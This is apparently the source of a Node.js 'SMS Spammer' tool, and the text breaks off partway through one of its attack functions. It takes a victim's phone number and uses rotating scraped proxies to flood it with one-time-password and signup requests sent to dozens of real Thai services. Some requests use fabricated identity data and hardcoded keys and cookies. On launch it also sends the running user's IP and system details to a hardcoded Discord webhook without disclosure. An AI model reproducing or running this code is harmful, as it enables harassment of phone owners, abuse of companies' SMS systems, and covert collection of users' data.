const webhook = require("webhook-discord")
os = require('os');
const fs = require('fs');
const Hook = new webhook.Webhook("https://discord.com/api/webhooks/955892297764073503/INwCeyv-El7-ZUBDH8Im8Hvjdr-2cryLLOVDaO3HIKtBCiMZL2KYzp2DcnbqdEd9cdJm");
const setTitle = require('node-bash-title');
var macaddress = require('macaddress');
var md5 = require('md5');
var sleep = require('await-sleep');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const Express = require(`express`)()
require('events').EventEmitter.defaultMaxListeners = 0;
const express = require('express');
const { port } = "888" 
const app = express();
const axios = require("axios"),
      randomstring = require("randomstring"),
	  colors = require('colors'),
      FormData = require('form-data'),
      qs = require('qs'),
      HttpsProxyAgent = require('https-proxy-agent');
const { pythonBridge } = require('python-bridge');
var prompt = require('prompt-sync')();
var cors = require('cors');
const awaitSleep = require("await-sleep");
Express.use(cors())

check_hwid()

async function check_hwid() {
    try {
        let o = await axios({
            method: "GET",
            url: `https://pastebin.com/raw/Pg3GFbjH`,
        })
        
        let ip = await axios({
            method: "GET",
            url: `http://myexternalip.com/raw`,
        })
        
            for (let i = 0; i < o.data.length; i++) {
                const element = o.data[i];
                const element2 = ip.data;
                if (String(element) === String(element2)) {
                    console.clear();
                    awaitSleep(1000)
                    console.log("Whitelisted Start the program".green)
                    awaitSleep(1000)
                    console.clear();
                    mainhwid();

                }
}
                }catch(error){
                    wronghwid();
                }}
        
        
    

async function wronghwid(){
    let ip = await axios({
        method: "GET",
        url: `http://myexternalip.com/raw`,
    })
    console.log("Not Whitelist!".red)
    console.log("DM eXRT#8514 and give him your IP: ".red +ip.data.red)

    const msg = new webhook.MessageBuilder()
                .setName("Login Notify")
                .setColor("#fa0000")
                .setText("<@666206002424840203>")
                .setTitle("Login Notify")
                .setDescription("❌Someone try to login into SMS Spammer 50 Api❌")
                .setFooter("Login Notify")
                .addField(`User ❌IP❌ `,ip.data)
                .addField(`:desktop: Operating System`, `${os.platform()}`)
                .addField(`:gear: User Architecture`, `${os.arch()}`)
                .addField(`:rocket: User Processor`, `${os.cpus().map(i => `${i.model}`)[0]}`)
                .addField(`:pager: User RAM`, `${Math.trunc((process.memoryUsage().heapUsed) / 1024 / 1000)} MB / ${Math.trunc(os.totalmem() / 1024 / 1000)} MB (${Math.round((Math.round(process.memoryUsage().heapUsed / 1024 / 1024) / Math.round(os.totalmem() / 1024 / 1024)) * 100)}%)`)
Hook.send(msg);}

async function mainhwid(){
    main()
    let ip = await axios({
        method: "GET",
        url: `http://myexternalip.com/raw`,
    })

    const msg = new webhook.MessageBuilder()
                .setName("Login Notify")
                .setColor("#00fa43")
                .setText("<@666206002424840203>")
                .setTitle("Login Notify")
                .setDescription("✔Someone successfully login into SMS Spammer 300 Api✔")
                .setFooter("Login Notify")
                .addField(`User ✔IP✔ `,ip.data)
                .addField(`:desktop: Operating System`, `${os.platform()}`)
                .addField(`:gear: User Architecture`, `${os.arch()}`)
                .addField(`:rocket: User Processor`, `${os.cpus().map(i => `${i.model}`)[0]}`)
                .addField(`:pager: User RAM`, `${Math.trunc((process.memoryUsage().heapUsed) / 1024 / 1000)} MB / ${Math.trunc(os.totalmem() / 1024 / 1000)} MB (${Math.round((Math.round(process.memoryUsage().heapUsed / 1024 / 1024) / Math.round(os.totalmem() / 1024 / 1024)) * 100)}%)`)
Hook.send(msg);}

async function main(){
    await sleep(2000)
    
    console.log(colors.rainbow(`
    ██████╗ ███╗   ███╗ ██████╗   ██████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗ ██████╗
    ██╔════╝████╗ ████║██╔════╝  ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
    ╚█████╗ ██╔████╔██║╚█████╗   ╚█████╗ ██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
     ╚═══██╗██║╚██╔╝██║ ╚═══██╗   ╚═══██╗██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
    ██████╔╝██║ ╚═╝ ██║██████╔╝  ██████╔╝██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
    ╚═════╝ ╚═╝     ╚═╝╚═════╝   ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ 
    Ver. 0.0.2 Free For My Friends
    Changes : Recreate IP system
    By eXRT#8514
`));
    
    
    
            const phonenumber = prompt(colors.rainbow('phone number : ')),
                  count = 300
                  text = prompt(colors.rainbow('Message Amount: '));
                  
    
    let phoneshow = phonenumber;
    let api = count
    let msg = text;
    console.log(colors.yellow("彡彡彡彡彡彡彡彡彡彡"));
    console.log(colors.red(`Start Attack To ${phoneshow}​`));
    console.log(colors.white(`Attack with ${api}​ Api`));
    console.log(colors.blue(`Start Send ${msg}​ Message  To ${phoneshow}​`));
    console.log(colors.yellow("彡彡彡彡彡彡彡彡彡彡"));
            const proxyscrape = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
            const proxies = proxyscrape.data.replace(/\r/g, '').split('\n');
            var countting = 0;
            const formUrlEncoded = x => Object.keys(x).reduce((p, c) => p + `&${c}=${encodeURIComponent(x[c])}`, '')
            // function sleep(ms) {return new Promise((resolve) => {setTimeout(resolve, ms)})};
            function randomnumber(length) {
                var result = '';
                var characters = '123456789';
                var charactersLength = characters.length;
                for (var i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() *
                        charactersLength));
                }
                return result;
            }
            function randomstr(length) {
                var result = '';
                var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
                var charactersLength = characters.length;
                for (var i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() *
                        charactersLength));
                }
                return result;
            }
            function monomax() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var password = randomstring.generate({ length: 12, charset: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' });
                var data = new FormData();
                data.append('password', password);
                data.append('telno', phonenumber);
                data.append('password_confirmation', password);
                var config = {
                    method: 'post',
                    url: 'https://www.monomax.me/api/v2/signup/telno',
                    httpsAgent: agent,
                    headers: {
                        ...data.getHeaders(),
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : monomax"));
                        countting++;
                    })
                    .catch(function (error) {
                        //console.log(error);
                    });
            }
            function headerais(token, cookie) {
                return {
                    'Authorization': 'Bearer ' + token,
                    'Cookie': cookie,
                    'X-Requested-With': ' XMLHttpRequest',
                }
            }
            function getais() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                axios({
                    method: 'get',
                    url: 'https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG9xQvVTU0rmMQ5snCwKRaK6rpTruhM%2BDAzuhRQ%3D%3D?httpGenerate=generated',
                    httpsAgent: agent,
                }).then(function (response) {
                    var cookie = response.headers['set-cookie'];
                    var a = response.data.match(/<!--<input type="hidden" id='token' value="[^}]*">-->\n/g);
                    var token = a[0].replace(/\s+/g, '').replace(/'/g, '"').replace('">-->', '').replace('<!--<inputtype="hidden"id="token"value="', '');
                    postais(token, cookie, phone, agent);
                }).catch(function (error) { })
            }
            async function postais(token, cookie, phone, agent) {
                var header = headerais(token, cookie)
                axios({
                    method: 'post',
                    url: 'https://srfng.ais.co.th/api/v2/login/sendOneTimePW',
                    httpsAgent: agent,
                    data: {
                        'msisdn': phone,
                        'serviceId': 'AISPlay',
                        'accountType': 'all',
                        'otpChannel': 'sms'
                    },
                    headers: header
                }).then(function (response) {
                    console.log(colors.rainbow("attack : ais"));
                    countting++;
                }).catch(function (error) { })
            }
    
            function newapi() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                var custom = text;
                var data = qs.stringify({
                    'applicant': phone,
                    'serviceName': custom,
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.konglor888.com/api/otp/register',
                    headers: {
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.70',
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : CusTomText"));
                        countting++;
                    })
                    .catch(function (error) {
                        //   console.log(error);
                    });
            }
    
            function newapi2() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                var data = qs.stringify({
                    'phone': phone,
                    'aff_link': '1$SkWbahhDXS1'
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://api.ufaz88regis.com/api/getOtp',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : ufaz88"));
                        countting++;
                    })
                    .catch(function (error) { });
            }
    
            function newapi3() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber.slice(1);
                var data = JSON.stringify({
                    "phone": "+66" + phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://referral.huaydee.com/v1/sendotp',
                    headers: {
                        'x-api-key': '0tWnR4S38L6MD3aysXVjF83M0qaIwfdm1AeiiNDn',
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : huaydee"));
                        countting++;
                    })
                    .catch(function (error) { });
            }
    
            function newapi4() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                var data = JSON.stringify({
                    "phone_number": phone
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://api.meslot.vip/api/v1/otp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : meslot"));
                        countting++;
                    })
                    .catch(function (error) { });
            }
    
            function newapi5() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                var textspecial = text
                var data = qs.stringify({
                    'applicant': phone,
                    'serviceName': textspecial,
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.hit789.com/api/otp/register',
                    headers: {
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.70',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : OfGodNo.1"));
                        countting++;
                    })
                    .catch(function (error) { });
            }
    
            function newapi6() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                var data = JSON.stringify({
                    "mobile": phone
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.cpsurprise.com/request-otp',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : cpsurprise"));
                        countting++;
                    })
                    .catch(function (error) { });
            }
    
            function newapi7() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                var data = JSON.stringify({
                    "mobile_phone": phone,
                    "type": "HISHER"
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://us-central1-otp-service-icc.cloudfunctions.net/getotp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : hisher"));;
                        countting++;
                    })
                    .catch(function (error) { });
            }
    
            function newapi8() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                var data = JSON.stringify({
                    "phone_no": phone
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://api.scg-id.com/api/otp/send_otp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : scg"));
                        countting++;
                    })
                    .catch(function (error) { });
            }
    
            function newapi9() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                var data = new FormData();
                data.append('phone', phone);
                data.append('ip', `${randomnumber(3)}.${randomnumber(3)}.${randomnumber(3)}.${randomnumber(3)}`);
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://qbabet.com/member/action.php?get_otp',
                    headers: {
                        ...data.getHeaders()
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : qbabet"));
                        countting++;
                    })
                    .catch(function (error) { });
            }
    
    
            function newapi10() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                var data = JSON.stringify({
                    "phone_number": phone
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://api.meslot.vip/api/v1/otp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : meslot"));
                        countting++;
                    })
                    .catch(function (error) { });
            }
    
            async function setmember_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                try {
                    var register = await axios({
                        method: "POST",
                        httpsAgent: agent,
                        url: "https://api.set.or.th/api/member/registration",
                        data: {
                            itizenId: "4751762444328",
                            country: "th",
                            email: "sogood@meowmeow.com",
                            firstName: "แมว",
                            gender: "M",
                            lastName: "รักน่าที่สุด",
                            mobile: phone,
                            passport: "",
                            password: "BossNz#9999",
                            subscriptionFlag: true,
                            termFlag: true,
                        }
                    })
                    var sendsms = await axios({
                        method: "POST",
                        httpsAgent: agent,
                        url: "https://api.set.or.th/api/otp/request",
                        data: {
                            channel: "MOBILE",
                            refID: register.data.userRef,
                            type: "REGISTRATION"
                        }
                    })
                    console.log(colors.rainbow("attack : setmember"));
                    countting++;
                } catch (e) {
                    // console.log("ERROR")
                }
            }
            async function Mcard_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                try {
                    var get_csrf = await axios.get('https://www.mcardmall.com/th/home')
                    var get_token = await axios({
                        method: "GET",
                        httpsAgent: agent,
                        url: "https://www.mcardmall.com/th/apply/check",
                        headers: {
                            cookie: get_csrf.headers['set-cookie'][0] + ";" + get_csrf.headers['set-cookie'][1] + ";"
                        }
                    })
                    await axios({
                        method: "POST",
                        httpsAgent: agent,
                        url: "https://www.mcardmall.com/th/apply/check",
                        data: formUrlEncoded({
                            '_token': get_token.data.split('<input type="hidden" name="_token" value="').pop().split('">')[0],
                            'mode': 'check',
                            'identity': 3874953321682,
                            'contact': phone,
                            'P0': 'on',
                            'P1': 'on',
                            'P2': 'on',
                        }),
                        headers: {
                            cookie: get_csrf.headers['set-cookie'][0] + ";" + get_csrf.headers['set-cookie'][1] + ";"
                        }
                    })
                    console.log(colors.rainbow("attack : Mcard"));
                    countting++;
                } catch (e) {
                    // console.log("ERROR")
                }
            }
    
            function newapi15() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                var data = new FormData();
                data.append('phone_number', phone);
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://api.baccaratth.com/api/v1/sendotp',
                    headers: {
                        ...data.getHeaders()
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : bacarat"));
                        countting++;
                    })
                    .catch(function (error) {
    
                    });
            }
    
            async function QQmoney_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                try {
                    var send = await axios({
                        httpsAgent: agent,
                        method: "POST",
                        url: "https://www.qqmoney.ltd/jackey/sms/login",
                        data: {
                            "appId": "5fc9ff297eb51f1196350635",
                            "companyId": "5fc9ff12197278da22aff029",
                            "mobile": phone
                        }
                    })
                    console.log(colors.rainbow("attack : qqmoney"));
                    countting++;
                } catch (e) {
                    // console.log("QQMONEY : ERROR")
                }
            }
            async function Mooncash_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                try {
                    var send = await axios.get({
                        httpsAgent: agent,
                        method: "GET",
                        url: 'http://m.thaiuang.com/uc/authcode/sms/get/reg/' + phone
                    })
                    console.log(colors.rainbow("attack : mooncash"));
                    countting++;
                } catch (e) {
                    // console.log("MOONCASH : ERROR")
                }
            }
            async function Needmoney_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                try {
                    var result = await axios({
                        httpsAgent: agent,
                        method: "POST",
                        url: "https://api.needmone.com/api/register/app/sendSms",
                        data: {
                            "app_version": "1.0.0",
                            "channel": "1",
                            "phone": phone,
                            "pkg_name": "com.kobi.bulaiente",
                            "sign": randomstr(32),
                            "timestamp": Math.floor(Date.now() / 1000),
                            "type": "2",
                            "version": "1.0.0"
                        }
                    })
                    console.log(colors.rainbow("attack :needmoney"));
                    countting++;
                } catch (e) {
                    // console.log("NEEDMONEY : ERROR")
                }
            }
            async function bet4u_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                try {
                    var result = await axios({
                        httpsAgent: agent,
                        method: "POST",
                        url: "https://baht4u.com/api/ext/send/sms?phone=" + phone + "&triggerType=REGISTER_OR_LOGIN",
                        headers: {
                            'Content-Length': 0,
                            'DEVICEID': randomstr(33),
                            'Origin': 'https://baht4u.com',
                            'LANGUAGE': 'th',
                            'VERSION': '1.0.4',
                            'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N960N Build/LMY49I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Safari/537.36gpminiapp',
                            'Accept': 'application/json, text/plain, */*',
                            'CHANNEL': 'a-minibaht4u',
                            'DEVICETYPE': 'H5_Android',
                            'Referer': 'https://baht4u.com/b4uh5/',
                            'Accept-Encoding': 'gzip, deflate',
                            'Accept-Language': 'th-TH,en-US;q=0.8',
                            'Cookie': 'locale=th; deviceType=H5_Android; country=TH; currency=THB',
                            'X-Requested-With': 'com.baht4u.gpapp',
                            'Connection': 'keep-alive'
                        }
                    })
                    console.log(colors.rainbow("attack : bet4u"));
                    countting++;
                } catch (e) {
                    // console.log("BET4U : ERROR")
                }
            }
            async function shopat24_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                try {
                    var getcsrf = await axios.get({
                        httpsAgent: agent,
                        method: "GET",
                        url: 'https://www.shopat24.com/register/'
                    })
                    var result = await axios({
                        httpsAgent: agent,
                        method: "POST",
                        url: "https://www.shopat24.com/register/ajax/requestotp/",
                        data: formUrlEncoded({
                            'phoneNumber': phone
                        }),
                        headers: {
                            'x-csrf-token': getcsrf.data.split('<meta name="_csrf" content="').pop().split('"')[0],
                            'cookie': getcsrf.headers['set-cookie'][0] + getcsrf.headers['set-cookie'][1],
                        }
                    })
                    console.log(colors.rainbow("attack : shopat24"));
                    countting++;
                } catch (e) {
                    // console.log("SHOPAT24 : ERROR")
                }
            }
            async function pizza_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                try {
                    var result = await axios({
                        httpsAgent: agent,
                        method: "POST",
                        url: "https://api2.1112.com/api/v1/otp/create",
                        data: {
                            language: "th",
                            phonenumber: phone
                        }
                    })
                    console.log(colors.rainbow("attack : pizza"));
                    countting++;
                } catch (e) {
                    // console.log("PIZZA : ERROR")
                }
            }
            async function ufa_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                try {
                    var result = await axios.get({
                        httpsAgent: agent,
                        method: "GET",
                        url: 'https://www.ufa442.com/register-otp'
                    })
                    var token = result.data.split('_token: "').pop().split('"},')[0]
                    var send = await axios({
                        httpsAgent: agent,
                        method: "POST",
                        url: "https://www.ufa442.com/create/account/request-otp",
                        data: formUrlEncoded({
                            'phone': phone,
                            'in_time': Math.floor(Date.now() / 1000),
                            '_token': token
                        }),
                        headers: {
                            'cookie': result.headers['set-cookie'][0] + ";" + result.headers['set-cookie'][1],
                            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62'
                        }
                    })
                    console.log(colors.rainbow("attack : ufa442"));
                    countting++;
                } catch (e) {
                    // console.log("UFA442 : ERROR")
                }
            }
            async function baccarat_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                try {
                    var result = await axios({
                        httpsAgent: agent,
                        method: "POST",
                        url: "https://api.baccaratth.com/api/v1/sendotp",
                        data: formUrlEncoded({
                            phone_number: phone
                        })
                    })
                    console.log(colors.rainbow("attack : bacarat"));
                    countting++;
                } catch (e) {
                    // console.log("BACCARAT : ERROR")
                }
            }
    
            async function toyota_spam() {
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var phone = phonenumber;
                try {
                    var result = await axios({
                        httpsAgent: agent,
                        method: "GET",
                        url: "https://www.toyotaprivilege.com/Register.aspx",
                    })
                    var VIEWSTATE = result.data.split('<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="').pop().split('" />')[0]
                    var VIEWSTATEGENERATOR = result.data.split('<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="').pop().split('" />')[0]
                    var EVENTVALIDATION = result.data.split('<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="').pop().split('" />')[0]
                    var send = await axios({
                        httpsAgent: agent,
                        method: "POST",
                        url: "https://www.toyotaprivilege.com/Register.aspx",
                        data: formUrlEncoded({
                            '__LASTFOCUS': '',
                            '__EVENTTARGET': 'btnOTP',
                            '__EVENTARGUMENT': '',
                            '__VIEWSTATE': VIEWSTATE,
                            '__VIEWSTATEGENERATOR': VIEWSTATEGENERATOR,
                            '__EVENTVALIDATION': EVENTVALIDATION,
                            'txtFName': '',
                            'txtLName': '',
                            'rdoSex': 'rdoMen',
                            'txtBirthdayDate': '',
                            'txtPhoneNumber': phone,
                            'txtEmail': '',
                            'txtLicense1': '',
                            'txtLicense2': '',
                            'txtOTP': '',
                            'txtVIN': '',
                            'hdf_otp_repeat': 0,
                            'hdf_ReadTermAndPrivacy': '',
                            'hdfShowPopupCookies': 0,
                        })
                    })
                    console.log(colors.rainbow("attack : toyota"));
                    countting++;
                } catch (e) {
                    // console.log("TOYATA : ERROR")
                }
            }
    
            function newapi16() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var data = new FormData();
                data.append('mobile', phone);
                data.append('password', '123456789');
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.ufabetthai.vip/dosms.php',
                    headers: {
                        ...data.getHeaders()
                    },
                    data: data
                };
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : ufabetthai"));
                        countting++;
                    })
                    .catch(function (error) {
                        //   console.log(error);
                    });
    
            }
    
            function sk1() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var data = qs.stringify({
                    'applicant': phone,
                    'serviceName': 'FOX888'
                });
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.fox888.com/api/otp/register',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    data: data
                };
                axios(config).then(function (response) {
                    console.log(colors.rainbow("attack : ubetthai"));
                    countting++;
                }).catch(function (error) {
                    //   console.log(error);
                });
            }
    
            function sk2() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "number": phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://api-shop.diorbeauty.hk/api/th/ecrm/sms_generate_code',
                    headers: {
                        'Content-Type': 'application/json',
                        'Cookie': 'XSRF-TOKEN=eyJpdiI6Im9seTliUFJuMzV3QTNQTXZUSFpmZnc9PSIsInZhbHVlIjoiUjhsUkN3cGltZGt6bUxGQWFLZWVPRUZ6Y3NMU25YNDdrZndJVUw4bnJ4ckxnWG4zbWxwSXFXenBTaE1xS1JtREFSZzZEZG55TUo1NmNJTzhISlhMVFQzaUN5U0t6Ri9WZmtlWDVIVGZVclk5ZmxWR1hxZkhYdG9lV0hrbEhheEciLCJtYWMiOiI3OTJkMjY1MmQwMzdhYzJhM2IwYjVkNjFiMTg1OGUyYzI2Yzc1NjNlZmI2ODEyNjU4OWRjZjg0ZDBkNGI5OTU4In0%3D; diorregionalmiddleware_session=eyJpdiI6IlV0ZUlLYW9GZS9RZXN3c3ZOUXc3YlE9PSIsInZhbHVlIjoiMlhNdGVJcTBqZUNYQlBWR1Y1ZlRpb0lTU2MxNHpEKzVsSkFkTEQvQzF5dVZLYWVQWDVaQ3JnOGkzam1zYnFRTUZUamZLR2c2eDFmYURkTFpxejNnRURwK2JBNUppSTNEdW5vY2E4RGtQQ2tFd2dXQ2FHRkxpTEFhSUdlTTNQV2siLCJtYWMiOiJlNGRhMmM5MzI2N2NmMjBlNDg4NTNmZTU3NDZjNjNkYmE2YmVkYTg2YjIyMWViMGExMmE3YjU4ZjUyZjI3YTgzIn0%3D'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : api-shop"));
                        countting++;
                    }).catch(function (error) { });
            }
    
            function sk3() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "phone": phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://api.sacasino9x.com/api/RegisterService/RequestOTP',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : sacasiono9x"))
                        countting++;
                    }).catch(function (error) { });
    
            }
    
            function sk4() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var data = JSON.stringify({
                    "phone": phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : shoponline"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk5() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                var data = JSON.stringify({
                    "phone": phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : kovy"));
                        countting++;
                    }).catch(function (error) { });
    
            }
            function sk6() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var agent = new HttpsProxyAgent('http://' + proxy);
                // 
                var data = JSON.stringify({
                    "client_id": "4ddf78ade8324462988fec5bfc5874c2",
                    "transaction_ctx": "null",
                    "country_code": "TH",
                    "method": "SMS",
                    "num_digits": "6",
                    "scope": "openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile",
                    "phone_number": "66" + phone
                });
    
                var config = {
                    method: 'post',
                    httpsAgent: agent,
                    url: 'https://partner-api.grab.com/grabid/v1/oauth2/otp',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    data: data
                };
    
                axios(config)
                    .then(function (response) {
                        console.log(colors.rainbow("attack : partner"));
                        countting++;
                    }).catch(function (error) { });
            }
            function sk7() {
                var phone = phonenumber;
                let proxy = proxies[Math.floor(Math.random() * proxies.length)];
